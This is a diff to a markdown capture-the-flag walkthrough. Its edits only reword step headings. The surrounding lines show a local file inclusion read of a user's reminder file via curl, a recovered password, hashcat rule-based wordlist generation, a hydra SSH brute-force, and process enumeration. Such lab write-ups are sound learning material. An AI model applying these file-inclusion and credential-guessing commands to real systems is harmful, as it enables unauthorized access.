@@ -97,7 +97,7 @@ sudo apt-get remove hashcat -y
 ```
 curl http://target-ip/index.php?page=file:///home/blue/.reminder
 ```
-###### We got what looks like a password, Nice :)<br>Output:
+###### We got what looks like a password, Nice 😃<br>Output:
 ```
 sup3r_p@s$w0rd!
 ```
@@ -106,7 +106,7 @@ Step 4:
 ```
 ssh blue@target-ip
 ```
-###### Yes! We got in... Urh not for long. The password does not work anymore :(<br>Maybe thats why hashcat created a password list from the one we found.
+###### Yes! We got in... Urh not for long. The password does not work anymore :(<br>Maybe thats why hashcat created a password list from the one we found.<br>Lets find out
 ```
 hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
 ```
@@ -123,13 +123,13 @@ sup3r_p@s$w0rd!1233
 sup3r_p@s$w0rd!1234
 .....
 ```
-###### Lets use 'hydra' on ssh
+###### Lets use 'hydra' with the passlist to check for ssh credentials
 ```
 hydra -l blue -P passlist.txt target-ip ssh
 ```
-###### Nice!, Now lets log in again.
+###### Nice!, Now lets login again.
 Step 5:
-###### These bash random texts are annoying. Anyway lets run a check whats running
+###### These bash random texts from red are annoying. Anyway lets stay strong mentally.<br>Use ps command and check whats processes are running
 ```
 ps -aux --forest
 ```
